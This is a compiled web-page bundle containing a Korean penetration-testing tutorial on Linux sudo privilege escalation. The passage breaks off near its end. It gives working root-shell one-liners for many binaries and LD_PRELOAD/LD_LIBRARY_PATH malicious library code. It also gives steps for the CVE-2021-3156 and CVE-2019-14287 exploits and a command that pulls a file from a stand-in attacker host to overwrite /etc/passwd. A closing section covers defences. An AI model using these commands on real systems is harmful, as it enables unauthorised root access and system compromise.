"use strict";(self.webpackChunkmy_docusaurus_website=self.webpackChunkmy_docusaurus_website||[]).push([[1313],{5884:(n,e,s)=>{s.r(e),s.d(e,{assets:()=>a,contentTitle:()=>o,default:()=>t,frontMatter:()=>r,metadata:()=>i,toc:()=>c});const i=JSON.parse('{"id":"penetration/post-exploitation/linux-privesc-sudo","title":"Linux Privilege Escalation - Sudo","description":"\uac1c\uc694","source":"@site/docs/penetration/post-exploitation/linux-privesc-sudo.md","sourceDirName":"penetration/post-exploitation","slug":"/penetration/post-exploitation/linux-privesc-sudo","permalink":"/my-docusaurus-page/penetration/post-exploitation/linux-privesc-sudo","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":3,"frontMatter":{"sidebar_position":3,"title":"Linux Privilege Escalation - Sudo"},"sidebar":"tutorialSidebar","previous":{"title":"Linux Privilege Escalation - SUID","permalink":"/my-docusaurus-page/penetration/post-exploitation/linux-privesc-suid"},"next":{"title":"Cheatsheet","permalink":"/my-docusaurus-page/category/cheatsheet"}}');var l=s(4848),d=s(8453);const r={sidebar_position:3,title:"Linux Privilege Escalation - Sudo"},o="Sudo \uad8c\ud55c \uc0c1\uc2b9",a={},c=[{value:"\uac1c\uc694",id:"\uac1c\uc694",level:2},{value:"Sudo \uad8c\ud55c \ud655\uc778",id:"sudo-\uad8c\ud55c-\ud655\uc778",level:2},{value:"\uae30\ubcf8 \ud655\uc778",id:"\uae30\ubcf8-\ud655\uc778",level:3},{value:"\ucd9c\ub825 \ud574\uc11d",id:"\ucd9c\ub825-\ud574\uc11d",level:3},{value:"GTFOBins Sudo \uc545\uc6a9",id:"gtfobins-sudo-\uc545\uc6a9",level:2},{value:"\uc8fc\uc694 Sudo \ubc14\uc774\ub108\ub9ac",id:"\uc8fc\uc694-sudo-\ubc14\uc774\ub108\ub9ac",level:2},{value:"vim/vi",id:"vimvi",level:3},{value:"python/python3",id:"pythonpython3",level:3},{value:"find",id:"find",level:3},{value:"less/more",id:"lessmore",level:3},{value:"awk",id:"awk",level:3},{value:"nmap",id:"nmap",level:3},{value:"perl",id:"perl",level:3},{value:"ruby",id:"ruby",level:3},{value:"php",id:"php",level:3},{value:"man",id:"man",level:3},{value:"nano",id:"nano",level:3},{value:"wget",id:"wget",level:3},{value:"cp",id:"cp",level:3},{value:"tar",id:"tar",level:3},{value:"zip/unzip",id:"zipunzip",level:3},{value:"git",id:"git",level:3},{value:"\ud658\uacbd \ubcc0\uc218 \uc545\uc6a9",id:"\ud658\uacbd-\ubcc0\uc218-\uc545\uc6a9",level:2},{value:"LD_PRELOAD",id:"ld_preload",level:3},{value:"LD_LIBRARY_PATH",id:"ld_library_path",level:3},{value:"CVE Exploits",id:"cve-exploits",level:2},{value:"CVE-2021-3156 (Sudo Baron Samedit)",id:"cve-2021-3156-sudo-baron-samedit",level:3},{value:"CVE-2019-14287",id:"cve-2019-14287",level:3},{value:"Sudo \uba85\ub839 Wildcards",id:"sudo-\uba85\ub839-wildcards",level:2},{value:"tar Wildcard",id:"tar-wildcard",level:3},{value:"rsync Wildcard",id:"rsync-wildcard",level:3},{value:"\uc2e4\uc2b5 \uc608\uc2dc",id:"\uc2e4\uc2b5-\uc608\uc2dc",level:2},{value:"\uc608\uc2dc 1: vim\uc744 \uc774\uc6a9\ud55c \uad8c\ud55c \uc0c1\uc2b9",id:"\uc608\uc2dc-1-vim\uc744-\uc774\uc6a9\ud55c-\uad8c\ud55c-\uc0c1\uc2b9",level:3},{value:"\uc608\uc2dc 2: find\ub97c \uc774\uc6a9\ud55c \uad8c\ud55c \uc0c1\uc2b9",id:"\uc608\uc2dc-2-find\ub97c-\uc774\uc6a9\ud55c-\uad8c\ud55c-\uc0c1\uc2b9",level:3},{value:"\uc608\uc2dc 3: LD_PRELOAD \uc545\uc6a9",id:"\uc608\uc2dc-3-ld_preload-\uc545\uc6a9",level:3},{value:"Sudoers \ud30c\uc77c \ubd84\uc11d",id:"sudoers-\ud30c\uc77c-\ubd84\uc11d",level:2},{value:"\ud30c\uc77c \uc704\uce58",id:"\ud30c\uc77c-\uc704\uce58",level:3},{value:"\ud30c\uc77c \ub0b4\uc6a9 \uc608\uc2dc",id:"\ud30c\uc77c-\ub0b4\uc6a9-\uc608\uc2dc",level:3},{value:"\ubc29\uc5b4 \ubc29\ubc95",id:"\ubc29\uc5b4-\ubc29\ubc95",level:2},{value:"\ucd5c\uc18c \uad8c\ud55c \uc6d0\uce59",id:"\ucd5c\uc18c-\uad8c\ud55c-\uc6d0\uce59",level:3},{value:"\ud658\uacbd \ubcc0\uc218 \uc81c\ud55c",id:"\ud658\uacbd-\ubcc0\uc218-\uc81c\ud55c",level:3},{value:"\uc815\uae30 \uac10\uc0ac",id:"\uc815\uae30-\uac10\uc0ac",level:3},{value:"\uc8fc\uc694 \uba85\ub839\uc5b4 \uc694\uc57d",id:"\uc8fc\uc694-\uba85\ub839\uc5b4-\uc694\uc57d",level:2},{value:"\uc2e4\ubb34 \ud301",id:"\uc2e4\ubb34-\ud301",level:2},{value:"\ub2e4\uc74c \ub2e8\uacc4",id:"\ub2e4\uc74c-\ub2e8\uacc4",level:2}];function h(n){const e={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,d.R)(),...n.components};return(0,l.jsxs)(l.Fragment,{children:[(0,l.jsx)(e.header,{children:(0,l.jsx)(e.h1,{id:"sudo-\uad8c\ud55c-\uc0c1\uc2b9",children:"Sudo \uad8c\ud55c \uc0c1\uc2b9"})}),"\n",(0,l.jsx)(e.h2,{id:"\uac1c\uc694",children:"\uac1c\uc694"}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"sudo (Super User DO)"}),": \ud2b9\uc815 \uc0ac\uc6a9\uc790\uc5d0\uac8c \ub2e4\ub978 \uc0ac\uc6a9\uc790(\uc8fc\ub85c root) \uad8c\ud55c\uc73c\ub85c \uba85\ub839 \uc2e4\ud589 \ud5c8\uc6a9"]}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\ud575\uc2ec \uac1c\ub150"}),":"]}),"\n",(0,l.jsxs)(e.ul,{children:["\n",(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.code,{children:"/etc/sudoers"})," \ud30c\uc77c\uc5d0 \uc815\uc758\ub41c \uad8c\ud55c"]}),"\n",(0,l.jsx)(e.li,{children:"\ud2b9\uc815 \uba85\ub839\uc5b4\ub9cc root \uad8c\ud55c\uc73c\ub85c \uc2e4\ud589 \uac00\ub2a5"}),"\n",(0,l.jsx)(e.li,{children:"\uc798\ubabb \uc124\uc815\ub41c sudo \uad8c\ud55c = \uad8c\ud55c \uc0c1\uc2b9 \uac00\ub2a5"}),"\n"]}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h2,{id:"sudo-\uad8c\ud55c-\ud655\uc778",children:"Sudo \uad8c\ud55c \ud655\uc778"}),"\n",(0,l.jsx)(e.h3,{id:"\uae30\ubcf8-\ud655\uc778",children:"\uae30\ubcf8 \ud655\uc778"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# \ud604\uc7ac \uc0ac\uc6a9\uc790 sudo \uad8c\ud55c\nsudo -l\n\n# \ube44\ubc00\ubc88\ud638 \uc694\uad6c \uc2dc \uc785\ub825\n"})}),"\n",(0,l.jsx)(e.h3,{id:"\ucd9c\ub825-\ud574\uc11d",children:"\ucd9c\ub825 \ud574\uc11d"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# \uc608\uc2dc \ucd9c\ub825 1:\nUser low may run the following commands on hostname:\n    (ALL) NOPASSWD: /usr/bin/vim\n    (root) /usr/bin/python\n\n# \uc608\uc2dc \ucd9c\ub825 2:\n(ALL, !root) /bin/bash\n"})}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\uc8fc\uc694 \uc635\uc158"}),":"]}),"\n",(0,l.jsxs)(e.ul,{children:["\n",(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.code,{children:"(ALL)"}),": \ubaa8\ub4e0 \uc0ac\uc6a9\uc790\ub85c \uc2e4\ud589 \uac00\ub2a5"]}),"\n",(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.code,{children:"(root)"}),": root \uad8c\ud55c\uc73c\ub85c\ub9cc \uc2e4\ud589 \uac00\ub2a5"]}),"\n",(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.code,{children:"NOPASSWD"}),": \ube44\ubc00\ubc88\ud638 \uc5c6\uc774 \uc2e4\ud589 \uac00\ub2a5"]}),"\n",(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.code,{children:"(ALL, !root)"}),": root \uc81c\uc678 \ubaa8\ub4e0 \uc0ac\uc6a9\uc790 (\ucde8\uc57d!)"]}),"\n"]}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h2,{id:"gtfobins-sudo-\uc545\uc6a9",children:"GTFOBins Sudo \uc545\uc6a9"}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"GTFOBins"}),": ",(0,l.jsx)(e.a,{href:"https://gtfobins.github.io/",children:"https://gtfobins.github.io/"})]}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\uc0ac\uc6a9 \ubc29\ubc95"}),":"]}),"\n",(0,l.jsxs)(e.ol,{children:["\n",(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.code,{children:"sudo -l"}),"\ub85c \uad8c\ud55c \ud655\uc778"]}),"\n",(0,l.jsx)(e.li,{children:"GTFOBins\uc5d0\uc11c \ubc14\uc774\ub108\ub9ac \uac80\uc0c9"}),"\n",(0,l.jsx)(e.li,{children:'"Sudo" \ud0ed \ud655\uc778'}),"\n",(0,l.jsx)(e.li,{children:"\uba85\ub839\uc5b4 \ubcf5\uc0ac \ubc0f \uc2e4\ud589"}),"\n"]}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h2,{id:"\uc8fc\uc694-sudo-\ubc14\uc774\ub108\ub9ac",children:"\uc8fc\uc694 Sudo \ubc14\uc774\ub108\ub9ac"}),"\n",(0,l.jsx)(e.h3,{id:"vimvi",children:"vim/vi"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# sudo -l \ucd9c\ub825:\n# (ALL) NOPASSWD: /usr/bin/vim\n\n# \uad8c\ud55c \uc0c1\uc2b9\nsudo vim -c ':!/bin/sh'\n\n# \ub610\ub294 vim \ub0b4\uc5d0\uc11c\nsudo vim\n:set shell=/bin/sh\n:shell\n\n# vi\nsudo vi -c ':!/bin/sh'\n"})}),"\n",(0,l.jsx)(e.h3,{id:"pythonpython3",children:"python/python3"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# sudo -l \ucd9c\ub825:\n# (ALL) NOPASSWD: /usr/bin/python\n\n# \uad8c\ud55c \uc0c1\uc2b9\nsudo python -c 'import os; os.system(\"/bin/sh\")'\n\n# Python3\nsudo python3 -c 'import os; os.system(\"/bin/sh\")'\n"})}),"\n",(0,l.jsx)(e.h3,{id:"find",children:"find"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# sudo -l \ucd9c\ub825:\n# (ALL) NOPASSWD: /usr/bin/find\n\n# \uad8c\ud55c \uc0c1\uc2b9\nsudo find . -exec /bin/sh \\; -quit\n"})}),"\n",(0,l.jsx)(e.h3,{id:"lessmore",children:"less/more"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# sudo -l \ucd9c\ub825:\n# (ALL) NOPASSWD: /usr/bin/less\n\n# \uad8c\ud55c \uc0c1\uc2b9\nsudo less /etc/passwd\n\n# less \ub0b4\uc5d0\uc11c \uc785\ub825:\n!/bin/sh\n"})}),"\n",(0,l.jsx)(e.h3,{id:"awk",children:"awk"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"sudo awk 'BEGIN {system(\"/bin/sh\")}'\n"})}),"\n",(0,l.jsx)(e.h3,{id:"nmap",children:"nmap"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# \uad6c\ubc84\uc804 nmap (< 5.21)\nsudo nmap --interactive\nnmap> !sh\nsh-4.1# whoami\nroot\n"})}),"\n",(0,l.jsx)(e.h3,{id:"perl",children:"perl"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"sudo perl -e 'exec \"/bin/sh\";'\n"})}),"\n",(0,l.jsx)(e.h3,{id:"ruby",children:"ruby"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"sudo ruby -e 'exec \"/bin/sh\"'\n"})}),"\n",(0,l.jsx)(e.h3,{id:"php",children:"php"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"sudo php -r \"system('/bin/sh');\"\n"})}),"\n",(0,l.jsx)(e.h3,{id:"man",children:"man"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"sudo man man\n\n# man \ud398\uc774\uc9c0 \ub0b4\uc5d0\uc11c:\n!/bin/sh\n"})}),"\n",(0,l.jsx)(e.h3,{id:"nano",children:"nano"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"sudo nano\n\n# Ctrl+R Ctrl+X \uc785\ub825 \ud6c4:\nreset; sh 1>&0 2>&0\n"})}),"\n",(0,l.jsx)(e.h3,{id:"wget",children:"wget"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# \ud30c\uc77c \uc77d\uae30\nsudo wget -O - file:///etc/shadow\n\n# \ud30c\uc77c \uc4f0\uae30 (\uc545\uc131 \uacc4\uc815 \ucd94\uac00)\necho 'hacker:x:0:0::/root:/bin/bash' > /tmp/passwd\nsudo wget http://attacker.com/passwd -O /etc/passwd\n"})}),"\n",(0,l.jsx)(e.h3,{id:"cp",children:"cp"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# /etc/passwd \ub36e\uc5b4\uc4f0\uae30\nsudo cp /tmp/malicious_passwd /etc/passwd\n"})}),"\n",(0,l.jsx)(e.h3,{id:"tar",children:"tar"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# \uc258 \uc2e4\ud589\nsudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh\n"})}),"\n",(0,l.jsx)(e.h3,{id:"zipunzip",children:"zip/unzip"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# zip\nTF=$(mktemp -u)\nsudo zip $TF /etc/hosts -T -TT 'sh #'\n\n# unzip\nsudo unzip -K shell.zip -d /tmp\n"})}),"\n",(0,l.jsx)(e.h3,{id:"git",children:"git"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"sudo git -p help\n# pager \ub0b4\uc5d0\uc11c:\n!/bin/sh\n"})}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h2,{id:"\ud658\uacbd-\ubcc0\uc218-\uc545\uc6a9",children:"\ud658\uacbd \ubcc0\uc218 \uc545\uc6a9"}),"\n",(0,l.jsx)(e.h3,{id:"ld_preload",children:"LD_PRELOAD"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:'# sudo -l \ucd9c\ub825 \ud655\uc778:\n# env_keep+=LD_PRELOAD\n\n# \uc545\uc131 \ub77c\uc774\ube0c\ub7ec\ub9ac \uc791\uc131 (shell.c)\ncat > shell.c << \'EOF\'\n#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\n\nvoid _init() {\n    unsetenv("LD_PRELOAD");\n    setgid(0);\n    setuid(0);\n    system("/bin/bash");\n}\nEOF\n\n# \ucef4\ud30c\uc77c\ngcc -fPIC -shared -o shell.so shell.c -nostartfiles\n\n# \uc2e4\ud589 (sudo\ub85c \uc2e4\ud589 \uac00\ub2a5\ud55c \uc544\ubb34 \uba85\ub839\uc5b4)\nsudo LD_PRELOAD=/tmp/shell.so find\n\n# Root \uc258 \ud68d\ub4dd!\n'})}),"\n",(0,l.jsx)(e.h3,{id:"ld_library_path",children:"LD_LIBRARY_PATH"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# sudo -l \ucd9c\ub825 \ud655\uc778:\n# env_keep+=LD_LIBRARY_PATH\n\n# 1. \ub300\uc0c1 \ubc14\uc774\ub108\ub9ac\uc758 \ub77c\uc774\ube0c\ub7ec\ub9ac \ud655\uc778\nldd /usr/bin/apache2\n\n# 2. \uc545\uc131 \ub77c\uc774\ube0c\ub7ec\ub9ac \uc0dd\uc131 (\uc704\uc640 \ub3d9\uc77c\ud55c C \ucf54\ub4dc)\ncat > library.c << 'EOF'\n#include <stdio.h>\n#include <stdlib.h>\n\nstatic void inject() __attribute__((constructor));\n\nvoid inject() {\n    setuid(0);\n    setgid(0);\n    system(\"/bin/bash -p\");\n}\nEOF\n\n# 3. \ucef4\ud30c\uc77c (\uc6d0\ubcf8 \ub77c\uc774\ube0c\ub7ec\ub9ac \uc774\ub984\uc73c\ub85c)\ngcc -fPIC -shared -o library.so.6 library.c\n\n# 4. \uc2e4\ud589\nsudo LD_LIBRARY_PATH=/tmp apache2\n"})}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h2,{id:"cve-exploits",children:"CVE Exploits"}),"\n",(0,l.jsx)(e.h3,{id:"cve-2021-3156-sudo-baron-samedit",children:"CVE-2021-3156 (Sudo Baron Samedit)"}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\ucde8\uc57d \ubc84\uc804"}),": Sudo 1.8.2-1.8.31p2, 1.9.0-1.9.5p1"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# 1. \ubc84\uc804 \ud655\uc778\nsudo -V | head -1\n# Sudo version 1.8.31\n\n# 2. Exploit \ub2e4\uc6b4\ub85c\ub4dc\ngit clone https://github.com/blasty/CVE-2021-3156.git\ncd CVE-2021-3156\n\n# 3. \ucef4\ud30c\uc77c\nmake\n\n# 4. \uc2e4\ud589\n./sudo-hax-me-a-sandwich\n\n# 5. Root \uc258 \ud68d\ub4dd!\n"})}),"\n",(0,l.jsx)(e.h3,{id:"cve-2019-14287",children:"CVE-2019-14287"}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\ucde8\uc57d \ubc84\uc804"}),": Sudo < 1.8.28"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# sudo -l \ucd9c\ub825:\n# (ALL, !root) /bin/bash\n\n# \uc545\uc6a9 (User ID -1 = 0 = root)\nsudo -u#-1 /bin/bash\n\n# \uc124\uba85:\n# -1\uc740 \ubd80\ud638 \uc788\ub294 \uc815\uc218\ub85c \ucd5c\ub313\uac12 (4294967295)\n# \uc774\uac83\uc774 UID 0 (root)\uc73c\ub85c \ud574\uc11d\ub428\n"})}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h2,{id:"sudo-\uba85\ub839-wildcards",children:"Sudo \uba85\ub839 Wildcards"}),"\n",(0,l.jsx)(e.h3,{id:"tar-wildcard",children:"tar Wildcard"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# sudo -l \ucd9c\ub825:\n# (ALL) NOPASSWD: /bin/tar *\n\n# \uad8c\ud55c \uc0c1\uc2b9\necho '/bin/sh' > /tmp/shell.sh\nchmod +x /tmp/shell.sh\nsudo tar -cf /dev/null /dev/null \\\n  --checkpoint=1 \\\n  --checkpoint-action=exec=/tmp/shell.sh\n"})}),"\n",(0,l.jsx)(e.h3,{id:"rsync-wildcard",children:"rsync Wildcard"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# sudo -l \ucd9c\ub825:\n# (ALL) NOPASSWD: /usr/bin/rsync *\n\n# \uad8c\ud55c \uc0c1\uc2b9\nsudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null\n"})}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h2,{id:"\uc2e4\uc2b5-\uc608\uc2dc",children:"\uc2e4\uc2b5 \uc608\uc2dc"}),"\n",(0,l.jsx)(e.h3,{id:"\uc608\uc2dc-1-vim\uc744-\uc774\uc6a9\ud55c-\uad8c\ud55c-\uc0c1\uc2b9",children:"\uc608\uc2dc 1: vim\uc744 \uc774\uc6a9\ud55c \uad8c\ud55c \uc0c1\uc2b9"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# 1. Sudo \uad8c\ud55c \ud655\uc778\nsudo -l\n# User low may run the following commands on hostname:\n#     (ALL) NOPASSWD: /usr/bin/vim\n\n# 2. GTFOBins\uc5d0\uc11c vim \uac80\uc0c9\n# https://gtfobins.github.io/gtfobins/vim/\n\n# 3. \uad8c\ud55c \uc0c1\uc2b9\nsudo vim -c ':!/bin/sh'\n\n# 4. \ud655\uc778\nid\n# uid=0(root) gid=0(root) groups=0(root)\n\nwhoami\n# root\n"})}),"\n",(0,l.jsx)(e.h3,{id:"\uc608\uc2dc-2-find\ub97c-\uc774\uc6a9\ud55c-\uad8c\ud55c-\uc0c1\uc2b9",children:"\uc608\uc2dc 2: find\ub97c \uc774\uc6a9\ud55c \uad8c\ud55c \uc0c1\uc2b9"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# 1. Sudo \uad8c\ud55c \ud655\uc778\nsudo -l\n# (ALL) NOPASSWD: /usr/bin/find\n\n# 2. \uad8c\ud55c \uc0c1\uc2b9\nsudo find . -exec /bin/sh \\; -quit\n\n# 3. \ud655\uc778\nwhoami\n# root\n"})}),"\n",(0,l.jsx)(e.h3,{id:"\uc608\uc2dc-3-ld_preload-\uc545\uc6a9",children:"\uc608\uc2dc 3: LD_PRELOAD \uc545\uc6a9"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:'# 1. Sudo \uad8c\ud55c \ud655\uc778\nsudo -l\n# env_keep+=LD_PRELOAD\n# (ALL) NOPASSWD: /usr/bin/find\n\n# 2. \uc545\uc131 \ub77c\uc774\ube0c\ub7ec\ub9ac \uc0dd\uc131\ncat > /tmp/shell.c << \'EOF\'\n#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\n\nvoid _init() {\n    unsetenv("LD_PRELOAD");\n    setgid(0);\n    setuid(0);\n    system("/bin/bash");\n}\nEOF\n\n# 3. \ucef4\ud30c\uc77c\ngcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles\n\n# 4. \uc2e4\ud589\nsudo LD_PRELOAD=/tmp/shell.so find\n\n# 5. Root \uc258 \ud68d\ub4dd!\n'})}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h2,{id:"sudoers-\ud30c\uc77c-\ubd84\uc11d",children:"Sudoers \ud30c\uc77c \ubd84\uc11d"}),"\n",(0,l.jsx)(e.h3,{id:"\ud30c\uc77c-\uc704\uce58",children:"\ud30c\uc77c \uc704\uce58"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# Sudoers \ud30c\uc77c\n/etc/sudoers\n\n# Sudoers \ub514\ub809\ud1a0\ub9ac\n/etc/sudoers.d/\n"})}),"\n",(0,l.jsx)(e.h3,{id:"\ud30c\uc77c-\ub0b4\uc6a9-\uc608\uc2dc",children:"\ud30c\uc77c \ub0b4\uc6a9 \uc608\uc2dc"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# /etc/sudoers\nroot    ALL=(ALL:ALL) ALL\n%sudo   ALL=(ALL:ALL) ALL\nuser    ALL=(ALL) NOPASSWD: /usr/bin/vim\nlow     (ALL, !root) /bin/bash\n"})}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\ud574\uc11d"}),":"]}),"\n",(0,l.jsxs)(e.ul,{children:["\n",(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.code,{children:"root ALL=(ALL:ALL) ALL"}),": root\ub294 \ubaa8\ub4e0 \uba85\ub839 \uc2e4\ud589 \uac00\ub2a5"]}),"\n",(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.code,{children:"%sudo ALL=(ALL:ALL) ALL"}),": sudo \uadf8\ub8f9 \uba64\ubc84\ub294 \ubaa8\ub4e0 \uba85\ub839 \uc2e4\ud589 \uac00\ub2a5"]}),"\n",(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.code,{children:"user ALL=(ALL) NOPASSWD: /usr/bin/vim"}),": user\ub294 \ube44\ubc00\ubc88\ud638 \uc5c6\uc774 vim \uc2e4\ud589 \uac00\ub2a5"]}),"\n",(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.code,{children:"low (ALL, !root) /bin/bash"}),": low\ub294 root \uc81c\uc678 \ubaa8\ub4e0 \uc0ac\uc6a9\uc790\ub85c bash \uc2e4\ud589 \uac00\ub2a5 (CVE-2019-14287 \ucde8\uc57d)"]}),"\n"]}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h2,{id:"\ubc29\uc5b4-\ubc29\ubc95",children:"\ubc29\uc5b4 \ubc29\ubc95"}),"\n",(0,l.jsx)(e.h3,{id:"\ucd5c\uc18c-\uad8c\ud55c-\uc6d0\uce59",children:"\ucd5c\uc18c \uad8c\ud55c \uc6d0\uce59"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# Sudoers \ud30c\uc77c \ud3b8\uc9d1\nvisudo\n\n# \u274c \ub098\uc05c \uc608\nuser ALL=(ALL) NOPASSWD: ALL\n\n# \u2705 \uc88b\uc740 \uc608 (\ud2b9\uc815 \uba85\ub839\uc5b4\ub9cc \ud5c8\uc6a9)\nuser ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart apache2\n\n# \u274c Wildcard \uc0ac\uc6a9 \uae08\uc9c0\nuser ALL=(ALL) NOPASSWD: /bin/tar *\n\n# \u2705 \uc808\ub300 \uacbd\ub85c\ub9cc \ud5c8\uc6a9\nuser ALL=(ALL) NOPASSWD: /bin/tar\n"})}),"\n",(0,l.jsx)(e.h3,{id:"\ud658\uacbd-\ubcc0\uc218-\uc81c\ud55c",children:"\ud658\uacbd \ubcc0\uc218 \uc81c\ud55c"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:'# Sudoers \ud30c\uc77c\uc5d0\uc11c\nDefaults    env_reset\nDefaults    env_keep -= "LD_PRELOAD"\nDefaults    env_keep -= "LD_LIBRARY_PATH"\n'})}),"\n",(0,l.jsx)(e.h3,{id:"\uc815\uae30-\uac10\uc0ac",children:"\uc815\uae30 \uac10\uc0ac"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# Sudo \ub85c\uadf8 \ud655\uc778\ncat /var/log/auth.log | grep sudo\n\n# Sudoers \ud30c\uc77c \uac80\uc99d\nvisudo -c\n"})}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h2,{id:"\uc8fc\uc694-\uba85\ub839\uc5b4-\uc694\uc57d",children:"\uc8fc\uc694 \uba85\ub839\uc5b4 \uc694\uc57d"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# Sudo \uad8c\ud55c \ud655\uc778\nsudo -l\n\n# GTFOBins \ud655\uc778\n# https://gtfobins.github.io/\n\n# \uad8c\ud55c \uc0c1\uc2b9 (\uc77c\ubc18\uc801\uc778 \ubc29\ubc95)\n\n# vim\nsudo vim -c ':!/bin/sh'\n\n# python\nsudo python -c 'import os; os.system(\"/bin/sh\")'\n\n# find\nsudo find . -exec /bin/sh \\; -quit\n\n# less\nsudo less /etc/passwd\n!/bin/sh\n\n# awk\nsudo awk 'BEGIN {system(\"/bin/sh\")}'\n\n# perl\nsudo perl -e 'exec \"/bin/sh\";'\n\n# CVE-2019-14287 \uc545\uc6a9\nsudo -u#-1 /bin/bash\n\n# CVE-2021-3156 \ud655\uc778\nsudo -V | head -1\n\n# \uad8c\ud55c \ud655\uc778\nid\nwhoami\n"})}),"\n",(0,l.jsx)(e.h2,{id:"\uc2e4\ubb34-\ud301",children:"\uc2e4\ubb34 \ud301"}),"\n",(0,l.jsxs)(e.ol,{children:["\n",(0,l.jsxs)(e.li,{children:["\u2705 ",(0,l.jsx)(e.strong,{children:"sudo -l \ucd5c\uc6b0\uc120"})," - \uac00\uc7a5 \ube60\ub978 \uad8c\ud55c \uc0c1\uc2b9 \uacbd\ub85c"]}),"\n",(0,l.jsxs)(e.li,{children:["\u2705 ",(0,l.jsx)(e.strong,{children:"GTFOBins \ud65c\uc6a9"})," - \ub300\ubd80\ubd84\uc758 \ubc14\uc774\ub108\ub9ac 